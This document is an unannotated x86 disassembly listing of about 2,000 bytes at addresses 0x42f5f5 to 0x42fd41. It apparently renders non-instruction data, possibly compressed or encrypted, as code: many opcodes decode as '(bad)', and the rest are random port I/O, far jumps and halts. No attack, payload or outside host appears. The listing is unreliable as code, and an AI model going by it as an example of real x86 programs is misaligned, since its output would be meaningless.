  42f5f5:	add    DWORD PTR [edx+ecx*2],ecx
  42f5f8:	(bad)  
  42f5f9:	shr    BYTE PTR [ebx+0x71],cl
  42f5fc:	ins    DWORD PTR es:[edi],dx
  42f5fd:	pusha  
  42f5fe:	inc    esi
  42f5ff:	dec    esi
  42f600:	jle    0x42f67c
  42f602:	dec    edi
  42f603:	add    al,0x9a
  42f605:	retf   
  42f606:	out    dx,al
  42f607:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f608:	jg     0x42f5d1
  42f60a:	rcr    BYTE PTR [eax+edi*1],cl
  42f60d:	(bad)  [ecx]
  42f60f:	lahf   
  42f610:	sbb    DWORD PTR [eax+eax*1+0x55],eax
  42f614:	push   ds
  42f615:	inc    ebp
  42f616:	sahf   
  42f617:	xchg   edx,eax
  42f618:	mov    edx,ss
  42f61a:	out    dx,al
  42f61b:	mov    dh,0x9e
  42f61d:	(bad)  
  42f61e:	cmp    al,0xa3
  42f620:	ins    BYTE PTR es:[edi],dx
  42f621:	pushf  
  42f622:	lock outs dx,BYTE PTR ds:[esi]
  42f625:	test   eax,0x52b61632
  42f62a:	repnz pop ds
  42f62c:	ja     0x42f67d
  42f62e:	out    dx,al
  42f62f:	mov    dl,0x26
  42f631:	in     eax,dx
  42f632:	xor    dl,ah
  42f634:	pop    esi
  42f635:	inc    edx
  42f636:	test   al,ah
  42f638:	xor    eax,0x11a314d5
  42f63d:	addr16 and ch,bl
  42f640:	fidiv  WORD PTR [ecx+0x69fb2ff1]
  42f646:	push   edi
  42f647:	cs pop esi
  42f649:	jmp    0x42f68c
  42f64b:	sub    ecx,DWORD PTR [ebx-0x70]
  42f64e:	sbb    BYTE PTR [ebx-0x7],al
  42f651:	mov    esi,0x8308a155
  42f656:	pop    esp
  42f657:	cmp    BYTE PTR gs:[edi-0x16],bl
  42f65b:	sub    al,0x5d
  42f65d:	cmp    eax,0x289fc5e1
  42f662:	sbb    al,0x42
  42f664:	jae    0x42f62e
  42f666:	inc    eax
  42f667:	mov    al,ds:0x20e611c
  42f66c:	addr16 (bad) 
  42f66e:	pop    ecx
  42f66f:	adc    esp,DWORD PTR [ebx]
  42f671:	(bad)
  42f674:	mov    eax,0xae753ed8
  42f679:	mov    ebp,0x282828e8
  42f67e:	mov    dh,0x9f
  42f680:	inc    ebp
  42f681:	cmp    eax,0x513ef097
  42f686:	arpl   WORD PTR [edx+0x5dee4936],cx
  42f68c:	adc    DWORD PTR [ecx-0x56595b15],ecx
  42f692:	pop    es
  42f693:	stos   DWORD PTR es:[edi],eax
  42f694:	inc    ebx
  42f695:	bound  ebp,QWORD PTR [esi+0x62]
  42f698:	jmp    0x42f665
  42f69a:	iret   
  42f69b:	jl     0x42f621
  42f69d:	loop   0x42f6f7
  42f69f:	push   es
  42f6a0:	pop    esi
  42f6a1:	inc    esi
  42f6a2:	fisub  DWORD PTR [esi-0x522c0f2a]
  42f6a8:	frstor [eax+0x2]
  42f6ab:	sbb    ebp,DWORD PTR [edx+0x19]
  42f6ae:	lahf   
  42f6af:	push   0x4c
  42f6b1:	lods   al,BYTE PTR ds:[esi]
  42f6b2:	jmp    0x42f6f4
  42f6b4:	sbb    DWORD PTR [ecx-0x79],edx
  42f6b7:	sub    ecx,edx
  42f6b9:	mov    al,0xeb
  42f6bb:	cmp    BYTE PTR [ecx+0x61],ah
  42f6be:	hlt    
  42f6bf:	shr    DWORD PTR [ebx+0x4c9a151e],1
  42f6c5:	(bad)  
  42f6c6:	out    dx,al
  42f6c7:	adc    eax,0x602e66db
  42f6cc:	mov    ah,0x64
  42f6ce:	dec    edi
  42f6cf:	test   al,0x1f
  42f6d1:	jg     0x42f675
  42f6d3:	push   ax
  42f6d5:	xor    DWORD PTR [ebx-0x11cad6f7],0x8041a1b8
  42f6df:	mov    ds:0xa0cf99c0,al
  42f6e4:	imul   edx,DWORD PTR [esi-0x715b2773],0xb45e277d
  42f6ee:	mov    edx,0x9a1bb36d
  42f6f3:	xor    DWORD PTR [esi+0x60],0x3f
  42f6f7:	xor    esi,DWORD PTR ds:0x56e17f84
  42f6fd:	dec    ebp
  42f6fe:	out    dx,al
  42f6ff:	bnd jg 0x42f6d2
  42f702:	ror    BYTE PTR [esi],cl
  42f704:	in     al,dx
  42f705:	jg     0x42f71d
  42f707:	mov    eax,ds:0x57b2d815
  42f70c:	sar    edx,cl
  42f70e:	ror    DWORD PTR [esi+ebx*2-0x45],1
  42f712:	hlt    
  42f713:	or     eax,0x9f87fe43
  42f718:	or     al,0x61
  42f71a:	inc    esi
  42f71b:	add    eax,0xa1e5a262
  42f720:	and    edx,DWORD PTR [eax]
  42f722:	sahf   
  42f723:	les    edx,FWORD PTR [ecx+0x2c]
  42f726:	jns    0x42f78b
  42f728:	xchg   ecx,eax
  42f729:	fldcw  WORD PTR [esi]
  42f72b:	or     ecx,ebx
  42f72d:	das    
  42f72e:	mov    edx,esp
  42f730:	sub    DWORD PTR [ecx+0x51],esp
  42f733:	daa    
  42f734:	fmulp  st(2),st
  42f736:	cdq    
  42f737:	push   esp
  42f738:	lea    edi,[ecx]
  42f73a:	out    dx,al
  42f73b:	ret    
  42f73c:	pop    eax
  42f73d:	arpl   cx,bp
  42f73f:	dec    ebx
  42f740:	xchg   edx,eax
  42f741:	or     BYTE PTR [ecx],dh
  42f743:	xor    DWORD PTR [esi+0x328ee659],ecx
  42f749:	jae    0x42f7a6
  42f74b:	jb     0x42f754
  42f74d:	(bad)  
  42f74e:	mov    bl,0x78
  42f750:	out    0xc,al
  42f752:	or     BYTE PTR [esi+0x65ef38df],dl
  42f758:	fidivr DWORD PTR [ecx-0x22dce3ac]
  42f75e:	jmp    0x41c7:0x95849edd
  42f765:	popa   
  42f766:	mov    edi,0x481f269f
  42f76b:	mov    eax,fs:0x3598ee0f
  42f771:	retf   0x7733
  42f774:	in     al,0x98
  42f776:	in     eax,0xa0
  42f778:	dec    ebx
  42f779:	mov    WORD PTR [esp+ebp*8+0x5c],es
  42f77d:	aad    0x68
  42f77f:	dec    ecx
  42f780:	pop    esi
  42f781:	dec    esi
  42f782:	(bad)  
  42f783:	stos   BYTE PTR es:[edi],al
  42f784:	enter  0xabbd,0x9d
  42f788:	ss popa 
  42f78a:	cmp    eax,0xdbff12c4
  42f78f:	or     esp,DWORD PTR [eax+0xc]
  42f792:	out    dx,al
  42f793:	add    edx,0x73acb46
  42f799:	jecxz  0x42f7d1
  42f79b:	mov    eax,ds:0xbd622eba
  42f7a0:	add    dh,0x5
  42f7a3:	adc    dl,BYTE PTR es:[ebp-0x77e5f15]
  42f7aa:	mov    esi,0xb4997981
  42f7af:	mov    al,ds:0x51d90e38
  42f7b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f7b5:	aam    0xaf
  42f7b7:	ds push esp
  42f7b9:	in     eax,dx
  42f7ba:	retf   
  42f7bb:	pop    ecx
  42f7bc:	sahf   
  42f7bd:	and    DWORD PTR [edx-0xf],ebx
  42f7c0:	pop    edi
  42f7c1:	mov    ch,0xfd
  42f7c3:	ins    BYTE PTR es:[edi],dx
  42f7c4:	out    0x42,al
  42f7c6:	pop    ds
  42f7c7:	or     eax,0xec9e60e0
  42f7cc:	mov    ebx,0x5dc7c1f8
  42f7d1:	pop    edi
  42f7d2:	inc    ecx
  42f7d3:	mov    edi,0x587d5371
  42f7d8:	push   0xffffff98
  42f7da:	jo     0x42f77d
  42f7dc:	data16 add BYTE PTR [ecx-0xdef1e02],ch
  42f7e3:	cmp    eax,0xe44deb5e
  42f7e8:	stos   DWORD PTR es:[edi],eax
  42f7e9:	mov    bl,0x49
  42f7eb:	movd   mm4,DWORD PTR [eax+0x6e]
  42f7ef:	xchg   DWORD PTR [eax+0x3df893b9],esi
  42f7f5:	xchg   esp,eax
  42f7f6:	out    dx,al
  42f7f7:	lock mov cl,0xfc
  42f7fa:	sub    BYTE PTR [esi-0x78],ch
  42f7fd:	add    esp,DWORD PTR [ecx+eiz*4]
  42f800:	int3   
  42f801:	xchg   edi,eax
  42f802:	jmp    0x51067ae9
  42f807:	mov    ds:0x4f7cf25e,eax
  42f80c:	iret   
  42f80d:	fxch   st(4)
  42f80f:	sub    edi,DWORD PTR [eax+0x60]
  42f812:	test   eax,0x847e5fdb
  42f817:	mov    esi,0x78eeff57
  42f81c:	mov    dh,0xec
  42f81e:	pop    esi
  42f81f:	(bad)  
  42f820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f821:	sti    
  42f822:	dec    edi
  42f823:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f824:	int    0x58
  42f826:	lods   al,BYTE PTR ds:[esi]
  42f827:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f828:	mov    bh,0xf8
  42f82a:	sub    ah,BYTE PTR [ecx-0x2f]
  42f82d:	jae    0x42f7cc
  42f82f:	pop    si
  42f831:	jmp    FWORD PTR [ebx-0xd6ae925]
  42f837:	pop    es
  42f838:	push   ebp
  42f839:	jne    0x42f823
  42f83b:	pop    edi
  42f83c:	and    esi,DWORD PTR [ebp+0x4d]
  42f83f:	mov    eax,ds:0x58879693
  42f844:	mov    edi,0xb313ee3a
  42f849:	js     0x42f867
  42f84b:	int3   
  42f84c:	sbb    DWORD PTR [esi+0x7adba7f4],ebp
  42f852:	inc    eax
  42f853:	xlat   BYTE PTR ds:[ebx]
  42f854:	sbb    edx,ecx
  42f856:	(bad)  
  42f858:	hlt    
  42f859:	in     eax,dx
  42f85a:	out    dx,al
  42f85b:	push   ss
  42f85c:	push   cs
  42f85d:	mov    ds:0x7f1a6b19,al
  42f862:	xor    esp,DWORD PTR [ecx+0x4b46efd0]
  42f868:	fisub  DWORD PTR [esi+edx*8]
  42f86b:	adc    BYTE PTR [esi-0x25],bl
  42f86e:	mov    esp,esi
  42f870:	sub    esi,DWORD PTR [ebp-0x449fd464]
  42f876:	lds    esp,FWORD PTR [eax+0x377b75c4]
  42f87c:	jbe    0x42f84a
  42f87e:	fld    DWORD PTR [ecx]
  42f880:	push   ebp
  42f881:	and    dh,BYTE PTR ds:0x668cdc35
  42f887:	jp     0x42f8ee
  42f889:	pop    esi
  42f88a:	fisttp WORD PTR ds:[eax]
  42f88d:	ret    
  42f88e:	xchg   edi,eax
  42f88f:	(bad)  
  42f890:	scas   al,BYTE PTR es:[edi]
  42f891:	jge    0x42f8b8
  42f893:	and    al,BYTE PTR [eax+0x309825fb]
  42f899:	sbb    ah,BYTE PTR gs:[ecx+0x1d67c1b5]
  42f8a0:	nop
  42f8a1:	dec    ebp
  42f8a2:	fisub  DWORD PTR [edx-0x42f7638b]
  42f8a8:	inc    eax
  42f8a9:	iret   
  42f8aa:	into   
  42f8ab:	pop    edx
  42f8ac:	pop    eax
  42f8ad:	test   BYTE PTR ds:0xcb5dfe75,ah
  42f8b3:	pop    esi
  42f8b4:	xor    edx,DWORD PTR [eax-0xa]
  42f8b7:	adc    BYTE PTR [ebx-0x18],bl
  42f8ba:	xlat   BYTE PTR ds:[ebx]
  42f8bb:	mov    al,ds:0x42566d9b
  42f8c0:	xor    DWORD PTR [esi],0xd
  42f8c3:	adc    al,0x5e
  42f8c5:	int3   
  42f8c6:	dec    esi
  42f8c7:	(bad)  
  42f8c8:	ret    
  42f8c9:	clc    
  42f8ca:	push   0x13
  42f8cc:	lds    esp,FWORD PTR [eax+0x4]
  42f8cf:	aam    0x20
  42f8d1:	sub    eax,0x50a4f6bf
  42f8d6:	out    dx,al
  42f8d7:	ss push esp
  42f8d9:	add    esi,DWORD PTR [ebx-0x766a1d15]
  42f8df:	mov    eax,ds:0x6892e781
  42f8e4:	sub    dl,BYTE PTR [edi]
  42f8e6:	push   edi
  42f8e7:	jbe    0x42f947
  42f8e9:	aaa    
  42f8ea:	xor    DWORD PTR [ebp+0x2667fd23],ebp
  42f8f0:	mov    ebx,0x4d9bdd60
  42f8f5:	les    eax,FWORD PTR [edx+edx*8]
  42f8f8:	push   edi
  42f8f9:	mov    esp,ebp
  42f8fb:	and    BYTE PTR [esi+0x42e5825a],bl
  42f901:	shl    DWORD PTR [esi+0x6a],0x79
  42f905:	pusha  
  42f906:	pop    ebx
  42f907:	cmp    al,0x7c
  42f909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f90a:	or     eax,DWORD PTR [eax]
  42f90c:	xor    BYTE PTR [ebx-0x12],al
  42f90f:	punpcklwd mm0,DWORD PTR ds:0xf8e5e914
  42f916:	frstor [ebp-0x8222b1]
  42f91c:	mov    dl,0x60
  42f91e:	inc    esp
  42f91f:	out    dx,eax
  42f920:	repnz dec esi
  42f922:	jno    0x42f8af
  42f924:	pop    esi
  42f925:	mov    ss,WORD PTR [ebx+0x43]
  42f928:	cmp    eax,DWORD PTR [ecx+0x6f]
  42f92b:	sub    DWORD PTR [eax+eiz*2+0x58],esi
  42f92f:	lea    ebp,[ebp+0x13db7de5]
  42f935:	into   
  42f936:	out    dx,al
  42f937:	js     0x42f956
  42f939:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f93a:	(bad)  [edi+edi*1-0x37]
  42f93e:	lock mov al,ds:0x8fc3dcf7
  42f944:	sbb    esi,DWORD PTR [ebx]
  42f946:	adc    cl,BYTE PTR [edx+0x34]
  42f949:	out    dx,al
  42f94a:	mov    esi,0x8e412720
  42f94f:	sahf   
  42f950:	jmp    0xf0e49601
  42f955:	addr16 test al,0x1
  42f958:	(bad)  
  42f959:	(bad)  
  42f95b:	rcr    DWORD PTR [esi+0x67],1
  42f95e:	int3   
  42f95f:	dec    ebx
  42f960:	push   ss
  42f961:	pop    ebx
  42f962:	sub    edx,DWORD PTR [esi]
  42f964:	ins    BYTE PTR es:[edi],dx
  42f965:	pop    edi
  42f966:	ins    DWORD PTR es:[edi],dx
  42f967:	mov    edx,0xabf24e1d
  42f96c:	xor    al,0xb9
  42f96e:	inc    al
  42f970:	pop    esi
  42f971:	mov    edx,0x39bf9f10
  42f976:	cmc    
  42f977:	sbb    DWORD PTR [esi+0xdfeb560],esi
  42f97d:	out    dx,al
  42f97e:	adc    al,0x4e
  42f980:	add    eax,0xa579ee60
  42f985:	pop    edx
  42f986:	or     BYTE PTR [eax-0x60619961],0x7d
  42f98d:	leave  
  42f98e:	add    eax,0x51523eae
  42f993:	ret    0x572a
  42f996:	in     eax,dx
  42f997:	mov    DWORD PTR [esi-0x2689b7bc],0x1ed64c92
  42f9a1:	ss daa 
  42f9a3:	push   edi
  42f9a4:	in     al,dx
  42f9a5:	cmp    dh,ch
  42f9a7:	xchg   esp,eax
  42f9a8:	fsubr  DWORD PTR [edi-0x4e7ded88]
  42f9ae:	in     al,0xa7
  42f9b0:	adc    al,0x1b
  42f9b2:	and    BYTE PTR [eax],al
  42f9b4:	shl    DWORD PTR [eax+0x52fbf5f5],1
  42f9ba:	out    dx,al
  42f9bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f9bc:	into   
  42f9bd:	(bad)  
  42f9be:	xchg   edx,eax
  42f9bf:	in     al,dx
  42f9c0:	sbb    DWORD PTR [edi+0x19],edx
  42f9c3:	mov    eax,ds:0x7e107d01
  42f9c8:	mov    ah,0x24
  42f9ca:	xor    eax,0x71085d61
  42f9cf:	jl     0x42f95a
  42f9d1:	cmp    esp,DWORD PTR [esi-0x51]
  42f9d4:	ds jno 0x42fa0b
  42f9d7:	mov    ebp,0xa155f9a4
  42f9dc:	push   esi
  42f9dd:	daa    
  42f9de:	je     0x42f9c7
  42f9e0:	fsubr  DWORD PTR [ecx]
  42f9e2:	jmp    0x42f972
  42f9e4:	jo     0x42f9b7
  42f9e6:	sub    BYTE PTR [esi+ebp*1-0x4a],ch
  42f9ea:	pop    es
  42f9eb:	sbb    DWORD PTR [esi],edi
  42f9ed:	imul   edi,DWORD PTR [ebx],0xba9193a1
  42f9f3:	sub    edx,DWORD PTR [eax-0x78]
  42f9f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f9f7:	stc    
  42f9f8:	adc    al,BYTE PTR [eax+edi*4-0x6315f5f]
  42f9ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fa00:	mov    ?,edi
  42fa02:	cs mov DWORD PTR ss:[ebp+0xf],ebx
  42fa07:	cmp    al,0x7b
  42fa09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa0a:	add    BYTE PTR [esi+eiz*8-0x13],cl
  42fa0e:	push   es
  42fa0f:	inc    ecx
  42fa10:	pop    ebp
  42fa11:	sub    bl,bl
  42fa13:	stos   DWORD PTR es:[edi],eax
  42fa14:	fidivr DWORD PTR [ebp+0x529639d5]
  42fa1a:	shl    BYTE PTR [eax+0x1965c90],0xe5
  42fa21:	inc    esp
  42fa22:	xchg   edx,eax
  42fa23:	test   DWORD PTR [ebx+0x13],ebx
  42fa26:	test   eax,0x2b8cb194
  42fa2b:	xor    dl,bh
  42fa2d:	int    0xf5
  42fa2f:	cmp    BYTE PTR [ebx],bh
  42fa31:	retf   0xa0e1
  42fa34:	mov    ecx,0x6b1cc7f7
  42fa39:	adc    edi,DWORD PTR [ebp+0x26805ef1]
  42fa3f:	aas    
  42fa40:	add    eax,0x77e71d7f
  42fa45:	pusha  
  42fa46:	and    ebx,DWORD PTR [esi+0x72e03f56]
  42fa4c:	inc    edi
  42fa4d:	icebp  
  42fa4e:	out    dx,al
  42fa4f:	dec    ecx
  42fa50:	pop    ebx
  42fa51:	sub    al,0x39
  42fa53:	inc    ebx
  42fa54:	adc    DWORD PTR [eax-0x16],edi
  42fa57:	xchg   esi,eax
  42fa58:	bound  eax,QWORD PTR [ecx-0x19e57061]
  42fa5e:	outs   dx,BYTE PTR ds:[esi]
  42fa5f:	test   DWORD PTR [ebp-0x3e],ebp
  42fa62:	fdiv   st(4),st
  42fa64:	and    DWORD PTR [ebp+0x162640ee],0x99475cd
  42fa6e:	enter  0x4c8e,0x75
  42fa72:	mov    esp,DWORD PTR [ecx]
  42fa74:	or     ecx,edx
  42fa76:	mov    esi,0xeda6db99
  42fa7b:	xor    cl,BYTE PTR [edx-0x68bfbe18]
  42fa81:	push   eax
  42fa82:	xor    bh,BYTE PTR [edi+0x21]
  42fa85:	popa   
  42fa86:	pop    ebx
  42fa87:	mov    edi,0x1040387b
  42fa8c:	xchg   BYTE PTR [edi+0x1f],cl
  42fa8f:	leave  
  42fa90:	sbb    ah,cl
  42fa92:	in     al,0xa5
  42fa94:	hlt    
  42fa95:	mov    esp,0x60eda541
  42fa9a:	sub    BYTE PTR [edi],dh
  42fa9c:	enter  0x68f3,0xce
  42faa0:	aad    0x37
  42faa2:	dec    esp
  42faa3:	retf   
  42faa4:	pop    esi
  42faa5:	add    DWORD PTR [edi+0x6530efab],ebx
  42faab:	mov    ds:0x24fe610f,eax
  42fab0:	add    al,0xf3
  42fab2:	outs   dx,BYTE PTR ds:[esi]
  42fab3:	shl    DWORD PTR [ecx+0x3f6aebed],1
  42fab9:	pop    ds
  42faba:	xor    BYTE PTR [ebx-0x42d1ff56],ch
  42fac0:	lods   al,BYTE PTR ds:[esi]
  42fac1:	mov    ds:0x272ca0ab,al
  42fac6:	out    0xa,al
  42fac8:	(bad)  
  42fac9:	fiadd  DWORD PTR [edx]
  42facb:	lods   al,BYTE PTR ds:[esi]
  42facc:	pop    esi
  42facd:	iret   
  42face:	mov    ecx,0x97577f93
  42fad3:	dec    edi
  42fad4:	inc    esi
  42fad5:	push   ebp
  42fad6:	dec    esi
  42fad7:	jp     0x42fb14
  42fad9:	inc    edx
  42fada:	fdivp  st(2),st
  42fadc:	pop    esi
  42fadd:	inc    eax
  42fade:	xlat   BYTE PTR ds:[ebx]
  42fadf:	and    BYTE PTR [esi+0x186be50],dl
  42fae5:	cs dec ebx
  42fae7:	mov    eax,ds:0xa2783260
  42faec:	and    al,0xfb
  42faee:	loop   0x42fb27
  42faf0:	test   BYTE PTR [ecx+eiz*1+0x536129ef],ch
  42faf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42faf8:	dec    esp
  42faf9:	sub    DWORD PTR [eax-0x6e],ebp
  42fafc:	lahf   
  42fafd:	pusha  
  42fafe:	rcl    DWORD PTR [ebp-0x7bf19a59],0x21
  42fb05:	icebp  
  42fb06:	out    dx,al
  42fb07:	mov    ah,0x84
  42fb09:	dec    ebp
  42fb0a:	aaa    
  42fb0b:	push   ebp
  42fb0c:	pushf  
  42fb0d:	in     eax,dx
  42fb0e:	or     BYTE PTR [eax+0x6a1dc92b],ah
  42fb14:	xor    esp,DWORD PTR [ecx-0x47]
  42fb17:	xchg   BYTE PTR [edx+0x64],ch
  42fb1a:	xor    ebx,DWORD PTR [ebx+0x12e8765e]
  42fb20:	js     0x42fb98
  42fb22:	data16 in al,dx
  42fb24:	mov    ds:0x1610b660,eax
  42fb29:	fs lahf 
  42fb2b:	data16 xor BYTE PTR [edx+0x0],dl
  42fb2f:	or     ecx,DWORD PTR [ebx-0x3ee6528b]
  42fb35:	test   eax,0x2f823a27
  42fb3a:	mov    eax,gs:0x61c8d0d2
  42fb40:	mov    bp,0xcebc
  42fb44:	pop    esi
  42fb45:	mov    esp,0x83b79d77
  42fb4a:	(bad)  
  42fb4b:	repnz jmp 0x4f60:0x9a5e8772
  42fb53:	je     0x42faf8
  42fb55:	xor    ebp,edi
  42fb57:	jecxz  0x42fbb7
  42fb59:	(bad)  
  42fb5a:	sub    al,0x6
  42fb5c:	fcmovne st,st(7)
  42fb5e:	push   ecx
  42fb5f:	int3   
  42fb60:	enter  0xd260,0x19
  42fb64:	dec    edx
  42fb65:	mov    esp,0xfcb90f6f
  42fb6a:	jmp    0x42fb1c
  42fb6c:	shl    cl,cl
  42fb6e:	jl     0x42fb2b
  42fb70:	xchg   esi,eax
  42fb71:	out    0x16,eax
  42fb73:	aas    
  42fb74:	out    dx,al
  42fb75:	retf   0xa18f
  42fb78:	dec    ebx
  42fb79:	and    al,0xfb
  42fb7b:	pop    esi
  42fb7c:	jge    0x42fb89
  42fb7e:	xor    esi,esi
  42fb80:	pop    esi
  42fb81:	push   ss
  42fb82:	xchg   ecx,eax
  42fb83:	inc    edx
  42fb84:	pop    ds
  42fb85:	mov    esi,DWORD PTR [esi+0x35]
  42fb88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fb89:	gs push esi
  42fb8b:	dec    ebp
  42fb8c:	outs   dx,BYTE PTR ds:[esi]
  42fb8d:	pusha  
  42fb8e:	add    eax,0x44a2cfe
  42fb93:	imul   edx,DWORD PTR [edi],0xc
  42fb96:	jmp    0x42fbca
  42fb98:	sbb    ecx,0xffffffa7
  42fb9b:	xor    al,0x15
  42fb9d:	loope  0x42fb71
  42fb9f:	xchg   ecx,eax
  42fba0:	lock push edx
  42fba2:	lods   al,BYTE PTR ds:[esi]
  42fba3:	lahf   
  42fba4:	test   dh,cl
  42fba6:	outs   dx,BYTE PTR ds:[esi]
  42fba7:	(bad)  
  42fba8:	fcom   st(4)
  42fbaa:	xchg   BYTE PTR [ebx+0x5e],ch
  42fbad:	outs   dx,BYTE PTR ds:[esi]
  42fbae:	xchg   ebp,eax
  42fbaf:	sbb    al,0x94
  42fbb1:	clc    
  42fbb2:	mov    edi,0xc560ce0e
  42fbb7:	inc    eax
  42fbb8:	xor    DWORD PTR [ebp+0x6],edx
  42fbbb:	test   BYTE PTR [ebx-0x47],dl
  42fbbe:	out    dx,al
  42fbbf:	in     al,0xb7
  42fbc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fbc2:	int3   
  42fbc3:	lahf   
  42fbc4:	pusha  
  42fbc5:	hlt    
  42fbc6:	gs int 0xf2
  42fbc9:	stc    
  42fbca:	out    dx,al
  42fbcb:	arpl   WORD PTR [esp+eax*2+0x2f],sp
  42fbcf:	mov    dh,0xfd
  42fbd1:	lock out dx,al
  42fbd3:	adc    DWORD PTR [eax+0x46],ebp
  42fbd6:	pop    ebx
  42fbd7:	div    DWORD PTR [ebp+0x33a24fab]
  42fbdd:	sbb    DWORD PTR [esi+0x67],ecx
  42fbe0:	loop   0x42fbbf
  42fbe2:	icebp  
  42fbe3:	rol    BYTE PTR [ebp+eiz*2-0x1],0x2c
  42fbe8:	fisubr WORD PTR [eax-0x44]
  42fbeb:	mov    cl,0x5e
  42fbed:	cli    
  42fbee:	shr    ebx,1
  42fbf0:	int3   
  42fbf1:	retf   
  42fbf2:	call   0xd275e98
  42fbf7:	lea    edi,[ecx]
  42fbf9:	xchg   ecx,eax
  42fbfa:	inc    ebx
  42fbfb:	dec    ecx
  42fbfc:	ret    0xee74
  42fbff:	cli    
  42fc00:	daa    
  42fc01:	dec    edx
  42fc02:	mov    ebp,0xc5f3a33f
  42fc07:	mov    BYTE PTR [ebx+0x11a12079],0xc6
  42fc0e:	push   eax
  42fc0f:	cs pop edi
  42fc11:	xchg   ebx,eax
  42fc12:	out    0xff,eax
  42fc14:	dec    ecx
  42fc15:	cs dec ebx
  42fc17:	aam    0xfe
  42fc19:	mov    eax,ds:0x64c8bc4e
  42fc1e:	jl     0x42fc6a
  42fc20:	fstp   QWORD PTR [edi+0x2a9a6de]
  42fc26:	test   DWORD PTR fs:[esi-0x1d410bd],esi
  42fc2d:	sbb    eax,0x52408105
  42fc32:	jae    0x42fc4f
  42fc34:	ss pop esp
  42fc36:	jmp    0xba70bb0
  42fc3b:	mov    eax,ds:0xed0ed37d
  42fc40:	rcr    BYTE PTR [esi+ebp*8+0x67],0x7c
  42fc45:	mov    ds:0x9527da96,al
  42fc4a:	adc    ebp,DWORD PTR [eax+0x241bdfa]
  42fc50:	and    edx,ebp
  42fc52:	fwait
  42fc53:	fs cld 
  42fc55:	xchg   ebx,eax
  42fc56:	xchg   esi,eax
  42fc57:	pop    eax
  42fc58:	call   0xc0a7ea9f
  42fc5d:	inc    eax
  42fc5e:	jo     0x42fcc0
  42fc60:	sub    dh,BYTE PTR ds:0xf8ca0f5
  42fc66:	jae    0x42fc21
  42fc68:	or     DWORD PTR [eax+0x755ef583],esp
  42fc6e:	adc    ebp,DWORD PTR [eax-0x21]
  42fc71:	or     DWORD PTR [eax],esi
  42fc73:	aas    
  42fc74:	push   cs
  42fc75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fc76:	sbb    BYTE PTR [ecx-0x7db0d44e],ah
  42fc7c:	xor    ebx,DWORD PTR ds:0xd454f837
  42fc82:	je     0x42fc4f
  42fc84:	ficomp WORD PTR [esi-0x58]
  42fc87:	std    
  42fc88:	or     DWORD PTR [edi],ebp
  42fc8a:	int    0x9b
  42fc8c:	dec    ebx
  42fc8d:	mov    eax,0xd55ec833
  42fc92:	adc    ecx,esi
  42fc94:	and    BYTE PTR [ebp+0x151838ee],ch
  42fc9a:	(bad)  
  42fc9b:	cwde   
  42fc9c:	jmp    0xbedf:0x428d6bc8
  42fca3:	and    BYTE PTR [esi],dl
  42fca5:	std    
  42fca6:	scas   eax,DWORD PTR es:[edi]
  42fca7:	clc    
  42fca8:	inc    esp
  42fca9:	(bad)  
  42fcaa:	loope  0x42fc6d
  42fcac:	pop    esi
  42fcad:	push   esi
  42fcae:	(bad)  
  42fcaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42fcb0:	dec    ebx
  42fcb1:	ja     0x42fcef
  42fcb3:	push   eax
  42fcb4:	add    BYTE PTR [ebp+0x7b],al
  42fcb7:	sub    eax,ecx
  42fcb9:	out    0x1f,al
  42fcbb:	adc    ebx,esi
  42fcbd:	xchg   BYTE PTR [edx],bh
  42fcbf:	cmp    edx,DWORD PTR [ecx-0x3c]
  42fcc2:	out    0x28,eax
  42fcc4:	fistp  DWORD PTR gs:[edi-0x5b]
  42fcc8:	loopne 0x42fd2a
  42fcca:	sub    BYTE PTR [edx+eiz*4],dl
  42fccd:	sbb    bh,ah
  42fccf:	mov    al,ds:0x57de8913
  42fcd4:	ror    BYTE PTR [edi+0x4c5ec331],cl
  42fcda:	lods   al,BYTE PTR ds:[esi]
  42fcdb:	out    dx,eax
  42fcdc:	mov    cl,0xc
  42fcde:	mov    ch,0xa8
  42fce0:	(bad)  
  42fce1:	pusha  
  42fce2:	adc    al,0x36
  42fce4:	je     0x71c89b4
  42fcea:	out    dx,eax
  42fceb:	rcr    BYTE PTR [ecx+0x5f],cl
  42fcee:	pop    esp
  42fcef:	enter  0xfd8,0xdc
  42fcf3:	dec    ecx
  42fcf4:	or     al,BYTE PTR [ecx+0x43]
  42fcf7:	call   0x40c85dc7
  42fcfc:	mov    edx,0x17577aa6
  42fd01:	mov    esp,0xb371a9ee
  42fd06:	add    DWORD PTR [ecx],esi
  42fd08:	popf   
  42fd09:	mov    DWORD PTR [ebx],eax
  42fd0b:	mov    eax,ds:0x20913838
  42fd10:	iret   
  42fd11:	test   ebp,0xd8fc5277
  42fd17:	pop    edi
  42fd18:	push   ds
  42fd19:	xchg   esp,eax
  42fd1a:	xchg   edi,eax
  42fd1b:	fistp  WORD PTR [edi+0x25]
  42fd1e:	dec    ecx
  42fd1f:	mov    eax,ds:0x9fb47ece
  42fd24:	ret    0x6fbd
  42fd27:	push   ds
  42fd28:	pop    esi
  42fd29:	test   BYTE PTR [edi],0xd9
  42fd2c:	xor    ah,BYTE PTR [edi+0x42]
  42fd2f:	das    
  42fd30:	xchg   BYTE PTR [edx-0x72],dl
  42fd33:	inc    esi
  42fd34:	pusha  
  42fd35:	sub    eax,0xe0f4eda9
  42fd3a:	push   edx
  42fd3b:	jle    0x42fcec
  42fd3d:	outs   dx,BYTE PTR ds:[esi]
  42fd3e:	out    dx,al
  42fd3f:	pushf  
  42fd40:	dec    edx
  42fd41:	adc    BYTE PTR [ebx+0x3c],ah
